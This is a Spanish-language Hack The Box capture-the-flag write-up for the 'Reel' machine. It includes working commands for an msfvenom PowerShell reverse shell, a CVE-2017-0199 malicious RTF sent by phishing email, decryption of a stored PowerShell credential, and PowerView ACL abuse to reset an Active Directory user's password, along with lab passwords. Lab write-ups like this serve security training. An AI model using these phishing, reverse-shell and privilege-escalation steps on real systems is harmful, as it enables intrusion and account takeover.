---
layout: single
title: Reel - Hack The Box
excerpt: "Realmente un buen cuadro de AD, necesitamos hacer un ataque de phishing para obtener una shell  y el primer usuario tiene permiso de WriteOwner sobre otro usuario. Y el segundo usuario tiene algún permiso WriteDacl sobre un grupo que tiene permiso para acceder al directorio del administrador."
date: 2022-09-5
classes: wide
header:
  teaser: /assets/images/htb-writeup-reel/reel_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - powershell
  - smtp
  - phishing
  - WriteDacl
  - WriteOwner
---

![](/assets/images/htb-writeup-reel/reel_logo.png)




Realmente un buen cuadro de AD, necesitamos hacer un ataque de phishing para obtener una shell  y el primer usuario tiene permiso de WriteOwner sobre otro usuario. Y el segundo usuario tiene algún permiso WriteDacl sobre un grupo que tiene permiso para acceder al directorio del administrador.

## Portscan

```ruby 
# Nmap 7.92 scan initiated Mon Sep  5 13:41:25 2022 as: nmap -sCV -p21,22,25 -oN targeted 10.10.10.77
Nmap scan report for 10.10.10.77
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.92%I=7%D=9/5%Time=631626BE%P=x86_64-pc-linux-gnu%r(NULL,
SF:18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20Se
SF:rvice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%r
SF:(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EHL
SF:O\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")
SF:%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20se
SF:quence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x2
SF:0sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVers
SF:ionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusRequ
SF:estTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"22
SF:0\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20M
SF:ail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n
SF:")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerberos
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mail
SF:\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20rea
SF:dy\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n503
SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x
SF:20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")%
SF:r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindReq
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Mai
SF:l\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence
SF:\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x
SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20
SF:commands\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  5 13:44:30 2022 -- 1 IP address (1 host up) scanned in 184.94 seconds

```

## Ftp
Listamos todo lo que hay en ftp y lo descargamos.
```bash
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> mget *
```

Con exiftool listamos la metadata de los archivos.
```bash
❯ exiftool * -Creator
======== AppLocker.docx
======== readme.txt
======== Windows Event Forwarding.docx
Creator                         : nico@megabank.com
    3 image files read
```

Encontramos un correo electrónico. Comprobamos si existe el usuario.

```bash

❯ telnet 10.10.10.77 25
Trying 10.10.10.77...
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
help
211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
HELO x
250 Hello.
MAIL FROM:cxdxnt@reel.htb
250 OK
RCPT TO:nico@megabank.com
250 OK
```
## Rce 

Según el archivo readme.txt el email nico@megabank.com solo va a abrir los archivos que tengan la extensión .rtf , entonces procedemos a buscar como crear un archivo rtf malicioso. Nos encontramos con esta herramienta.

![](/assets/images/htb-writeup-reel/vulnerabilidad.png)

Para ganar acceso al sistema tenemos que hacer lo siguiente.

```bash
1.crear un archivo hta y rtf malicioso # msfvenom -p windows/x64/powershell_reverse_tcp lhost=10.10.14.8 lport=443 -f hta-psh > shell.hta
                                       #python2 cve-2017-0199_toolkit.py -M gen -w pwned.rtf -u http://10.10.14.8/shell.hta -t RTF -x 0
2. ponerte en escucha en el puerto 80 # python3 -m http.server 80
3.mandar el email y esperar.# sendEmail -f cxdxnt@reel.htb  -t "nico@megabank.com" -s 10.10.10.77 -u "Interesante archivo" -a pwned.rtf -m "testing"
```
Ganamos acceso como nico.

![](/assets/images/htb-writeup-reel/ganar-acceso-como-nico.png)

## Elevacion de privilegios

En el directorio nico\Desktop nos encontramos un cred.xml

```powershell
type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

Tenemos una password "cifrada", tratamos de  ver como podemos obtenerla en texto claro.

```powershell
c:\Users\nico\Desktop\powershell -c "$cred = Import-Clixml -Path cred.xml;$cred.GetNetworkCredential().Password"
# password -> 1ts-mag1c!!!

c:\Users\nico\Desktop>
```

Nos conectamos como Tom

```powershell
sshpass '1ts-mag1c!!!' tom@10.10.10.77

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

tom@REEL C:\Users\tom>whoami                                                                                                    
htb\tom                                                                                                                         

tom@REEL C:\Users\tom> 
```
Vemos un acls.csv y lo traemos a nuestra maquiná.

![](/assets/images/htb-writeup-reel/acls.png)

Hacemos un filter por la palabra tom en el principalName, y nos encontramos lo siguiente.
![](/assets/images/htb-writeup-reel/filtrar.png)

Vemos que tiene el permiso writeowner, que esta vulnerabilidad permite cambiarle la contraseña a un usuario, en este caso a claire. Buscamos información por internet y procedemos a ser lo siguiente.

```powershell
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom                          
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPass
word                                                                                                                            
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "pwned@#$" -AsPlainText -force              
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred                     
PS C:\Users\tom\Desktop\AD Audit\BloodHound> 
```

Estamos como claire.

![](/assets/images/htb-writeup-reel/claire.png)

Ahora procedemos a agregar a claire al grupo backups_admin.


```powershell
PS C:\Users\claire\Desktop> net group Backup_Admins claire /add                                                                 
The command completed successfully.                                                                                             

PS C:\Users\claire\Desktop> 
```

Logramos entrar a la carpeta admin.

## Fase final:

Entramos en la carpeta Desktop\Backups, y encontramos muchos scripts.

```powershell
PS C:\Users\Administrator\Desktop\Backup Scripts> dir                                                                           


    Directory: C:\Users\Administrator\Desktop\Backup Scripts                                                                    


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---         11/3/2017  11:22 PM        845 backup.ps1                                                                         
-a---         11/2/2017   9:37 PM        462 backup1.ps1                                                                        
-a---         11/3/2017  11:21 PM       5642 BackupScript.ps1                                                                   
-a---         11/2/2017   9:43 PM       2791 BackupScript.zip                                                                   
-a---         11/3/2017  11:22 PM       1855 folders-system-state.txt                                                           
-a---         11/3/2017  11:22 PM        308 test2.ps1.txt                                                                      


PS C:\Users\Administrator\Desktop\Backup Scripts> 

```

Procedemos a ser un filtrado por una palabra clave y encontramos:

```powershell

PS C:\Users\Administrator\Desktop\Backup Scripts> type * | findstr "password"                                                   
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"                                                                                                    
PS C:\Users\Administrator\Desktop\Backup Scripts> 
```
Accedimos como root.

![](/assets/images/htb-writeup-reel/root.png)
